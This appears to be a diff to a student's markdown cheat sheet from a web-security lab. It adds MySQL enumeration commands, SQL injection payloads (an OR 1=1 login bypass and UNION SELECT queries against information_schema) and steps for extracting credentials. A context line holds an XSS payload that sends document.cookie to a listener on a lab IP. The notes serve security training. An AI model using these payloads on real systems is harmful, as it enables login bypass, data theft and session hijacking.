@@ -135,6 +135,61 @@ python3 -m http.server
 <script>document.location="http://10.50.30.229:8000/?username=student" + document.cookie;</script>
 ```
 
+# SQL Commands
+
+## Commands for demo
+```
+mysql    # shows information regarding the server
+help    # shows help
+show databases ;    # shows what databases you can access. if you forget the semicolon if will not work.
+```
+### Default Databases
+- information_schema    # contains information regarding all other databases
+- mysql                 #
+- performance_schema    #
+```
+show tables
+```
+### big three
+- database
+- table
+- columns
+```
+show columns from columns ;
+```
+### Three golen nuggets
+- table schema
+- table name
+- column name
+### The Golden statement
+```
+select table_schema, table_name, column_name from information_schema.columns
+```
+### selecting multiple fields
+```
+select username, passwd, studentID from session.userinfo ;
+select carid, type from session.cars ;
+```
+
+## SQL injection
+```
+'OR 1='1      #truth statement added to logins to get authentication
+Audi 'UNION SELECT 1,2,3,4 #
+Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #
+
+```
+### Steps for creds
+- 1. input your true bool statement in both fields
+- 2. observe the get request with dev tool
+- 3. paste the get request into the html bar with a ? before to query it
+- 4. observe creds
+
+
+### steps for fuzzzy/spitballing
+- 1. Identify the vuln field      # ford 'OR 1='1
+- 2. Identify how many columns    # Audi 'UNION SELECT 1,2,3,4 #
+- 3. Edit the golden statement    # build your golden statement to print every column with placeholders in the columns that are mising.
+
 
 
 
